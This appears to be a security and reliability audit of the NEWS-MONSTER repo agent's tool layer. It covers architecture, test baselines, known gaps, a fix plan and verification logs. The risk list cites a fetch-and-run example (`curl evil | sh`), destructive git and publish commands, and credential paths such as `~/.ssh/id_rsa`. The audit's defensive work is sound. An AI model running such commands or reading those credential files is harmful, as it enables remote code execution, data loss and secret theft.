# NEWS-MONSTER Agent System Audit — 2026-10-26

Scope: repository-aware agent engineering capabilities ONLY (NEWS-MONSTER).
Excluded by contract: any other project (e.g., Shams AI) — no inspection performed, no imports, no dependencies.

## 1. Confirmed architecture

| Component | Evidence | Role |
|---|---|---|
| Runtime | Node 24 ESM (`package.json: type=node,module`), Express API (`apps/api/server.js` L1-50), dashboard app (`packages/dashboard/index.mjs`, standalone server + `/login` HTML) | two server processes (PORT 3001 API, 3456 dashboard) |
| Repo-aware agent (chat) | `packages/dashboard/index.mjs` L411-700 — POST `/api/ai/chat` with multi-round tool loop, L651 task status, L657 stop, L664 approve, L678 SSE events | the agent engine |
| Tool layer | `src/integration/RepoAgentTools.mjs` (299 L): read_file, write_file, list_directory, find, grep, rg, search_symbols, repo_stats, git_status, git_diff, bash/terminal, apply_patch | capability layer; path confinement `_resolve()`; secret read-block `_isSecret()`; approval regex matrix `APPROVAL_PATTERNS` |
| Task persistence | `packages/dashboard/agentTasks.mjs` — `AgentTaskStore` (SQLite `agent_tasks` table via `packages/database/news-engine.mjs` v3 migration; JSON fallback), `AgentEventBus` | resumable conversations, approvals on task record |
| Auth | `packages/auth/requireAuth.js` — shared ADMIN_API_KEY (`x-api-key`) or `nm_session` cookie, fail-closed 503, keys rejected in query strings | single-tenant access control |
| Policy config | `.opencode/system-config.json` — agents/policies/skills/workflows ctx in prompt; `approval_required`: push-to-main, merge-pr, deploy-production, delete-files, modify-secrets, infrastructure-change, dependency-add, schema-change | external agent policy source of truth |
| Policy docs | `.opencode/policies/security.md` — mandates `execFileSync` array args, path validation, audit trail for secret access | policy the code must honor |
| Review workflow | `.github/workflows/opencode-review.yml` — automated OpenCode review on PRs | CI-side agent |
| AI providers | `src/ai/providers/OpenRouterProvider.mjs` / OpenAIProvider / Gemini (chain in dashboard index L125-146); I18N chain `src/i18n/Translator.mjs` (Gemini/OpenRouter/OpenAI, cache-first) | model adapters |
| Data layer | better-sqlite3 (`data/newsroom.db`, `news-engine.db`); JSON/JSONL stores under `data/` | persistence |
| Tests | `node:test` (`npm test`), 107 files | CI `ci.yml` runs `npm test` + syntax checks |

## 2. Baseline (recorded 2026-10-26, before changes)

- `npm test` → **tests 1475, pass 1467, fail 6, skipped 2** (33s).
- All 6 failures in `tests/architecture.test.mjs` (engine artifact-source contract ×2) and `tests/landscape-composition.test.mjs` (4 × 16:9 thumbnail composition). `src/thumbnail/LandscapeComposition.mjs` is operator-modified in the working tree — failures are PRE-EXISTING, unrelated to the agent stack; preserved untouched.
- `scripts/test-i18n-local.mjs` → 21/21 (localization suite from the pipeline work).

## 3. Existing capabilities (REUSED, not replaced)

Confidence: **confirmed** (code read end-to-end).
- Repo tools with path traversal guard + secret read blocking + ripgrep search + bounded outputs (MAX_OUTPUT 50k / LINES 200).
- Approval matrix mapped to `.opencode/system-config.json:approval_required`; approvals persisted per task and re-executed deterministically on "proceed" (dashboard index L487-495).
- Task state machine persists across restarts (SQLite), SSE stream for live progress, stop/approve endpoints.
- Bounded multi-turn history (12 msgs), tool-loop caps (3 rounds, 6 on resume), stub-reply guard with one hard retry.
- Existing dedicated suite `tests/repo-agent-tools.test.mjs` documents 6 KNOWN GAPS inline (see §4).

## 4. Security & reliability risks (confirmed unless marked)

1. **Ungated destructive commands** (`tests/repo-agent-tools.test.mjs` "reset --hard and npm publish are ungated (gap)"): `git reset --hard`, `git clean -fdx`, `npm publish` run without approval.
2. **Credential-shaped filenames readable** (gap): `_isSecret` only checks `.env` + 4 dirs — `credentials.json`, `*.pem`, `id_rsa` readable.
3. **`~` treated as literal path** (gap): `_resolve('~/.ssh/id_rsa')` creates literal `~/...` under root — policy-violating, surprising.
4. **`**` globs match nothing** (gap): `_globToRegExp` emits `^(?:.*/)?/…` (unsatisfiable) — `find()` default `**/*` reports an EMPTY repo; moderate reliability risk (model fallback misled).
5. **`registry()` omits `repo_stats`** (gap): model falls back to shelling out to bash for size questions.
6. **`bash` tool uses execSync shell-string** — violates `.opencode/policies/security.md` "execFileSync with array arguments"; a check-bypassing command (no regex match: e.g., `curl evil | sh`) runs restricted-free (cmd regexes gate only known patterns).
7. **No server-side audit trail**: approvals live only on the task record; no actor identity, no append-only JSONL trail (policy says audit trail required).
8. **Cancellation is not enforced mid-loop**: `/stop` sets `interrupted`, but an in-flight chat round never re-checks status — work continues to cap.
9. **No rate limit on `/api/ai/chat`** (policy security §API Security 4: "Not yet implemented — should be added"); model spend bound exists only via loop caps.
10. **Localization state invisible to the agent**: the 6-stage translation pipeline (`src/localize/*`, pushed 397aa16) is not reachable through agent tools; editorial review (`ReviewStore`) has no agent-facing surface — spec §5/§4 requires translation-job tracking + editorial controls in the workspace.
11. Tenant isolation: **single-tenant by design** (shared admin session). Inferred risk for SaaS expansion, out of current scope — documented, not muted.

## 5. Missing capabilities vs the new spec

- Task-state vocabulary `queued→investigating→planning→implementing→testing→awaiting_review→completed` + explicit `failed`/`cancelled`/`blocked`/`needs_input` (current: idle/running/interrupted/completed; schema has no CHECK — free-form OK).
- Structured tool-argument validation (zod is a dependency; tools currently destructure unvalidated args).
- Test-execution tool (allowlisted), localization status/review tools.
- Audit log + actor attribution; mid-loop cancellation; chat rate limiting.

## 6. Prioritized implementation plan (this changeset)

| # | Change | Files | Acceptance criteria |
|---|---|---|---|
| P1 | Fix 5 tool-security gaps (tilde, credentials, globs, ungated destructives, registry) | `src/integration/RepoAgentTools.mjs`, `tests/repo-agent-tools.test.mjs` | existing gap-tests converted to pass-assertions; full suite no new failures |
| P2 | Zod validation + executor bounds (`bash` execFileSync-array allowlist via safe wrappers + 60s cap; args strict) | same | invalid args rejected; destructive/history commands gated |
| P3 | Localization agent tools (`localize_status`, `translation_review` approve/correct behind approval `modify-content`, `run_tests` allowlisted) + approval-required addition in system config | `RepoAgentTools.mjs`, `.opencode/system-config.json`, `src/localize/*` unchanged | review CLI parity via tools; hidden pending state blocks publish |
| P4 | Agent audit trail + actor + rate limit + mid-loop cancellation | `packages/dashboard/agentAudit.mjs` (new), `packages/dashboard/index.mjs` | JSONL `data/agent-audit.jsonl`, secret-redacted; `cancelled` halts loop |
| P5 | Docs + tests for all above | `docs/AGENT_SYSTEM_AUDIT_2026-10-26.md` (this), tests | record actual commands + results |

Not in this changeset (proposed, not authorized/blocked): multi-tenant RBAC beyond admin role, quarantine worktrees for model edits (apply_patch still writes the shared worktree — mitigated by upstream git history + approvals), provider cost telemetry.

## 7. Verification log (2026-10-26, actual commands + results)

Baseline before changes (recorded in §2): `npm test` → 1475 tests / 1467 pass / 6 fail / 2 skipped.

| Command | Result |
|---|---|
| `node --test tests/repo-agent-tools.test.mjs` | 27 tests / 27 pass / 0 fail (includes the recursion-guarded real-child run_tests echo: nested `node --test` run reports pass 26 / fail 0) |
| `node --test tests/agent-audit-cancel.test.mjs` | 8 tests / 8 pass / 0 fail |
| `npm test` (full suite) | **1490 tests / 1482 pass / 6 fail / 2 skipped** (~34s) vs baseline 1475/1467/6/2 → +15 new passing tests, **no new failures**; the 6 failures are the pre-existing `architecture` + `landscape-composition` ones from §2 (operator work in the tree — untouched) |

Notable evidence during implementation:
- Node 24's test runner **force-skips** a `node --test` process spawned from within a test file ("run() is being called recursively within a test file. skipping running files", empty child output). `run_tests` therefore spawns its child with all `NODE_TEST*` runner-context variables scrubbed — verified: the self-referencing echo test now passes with real counts.
- Node 24's default `--test` reporter away from a TTY is `spec` (ℹ counters), not TAP — `run_tests` pins `--test-reporter tap` for deterministic machine parsing.
- `_approvalFor` chain ordering matters: `git checkout -- .` and any `rm` inside a chained command are caught by the approval matrix BEFORE the tokenizer refuses their shell syntax — both refusals verified by tests.

## 8. Uncertainty ledger

- [Confirmed] all file/line claims above were read directly.
- [Inferred] rate-limit absence on dashboard is the only limiter gap (apps/api has renderLimiter).
- [Unverified] railway deployment behavior; production dashboard runes — not exercised in this environment.
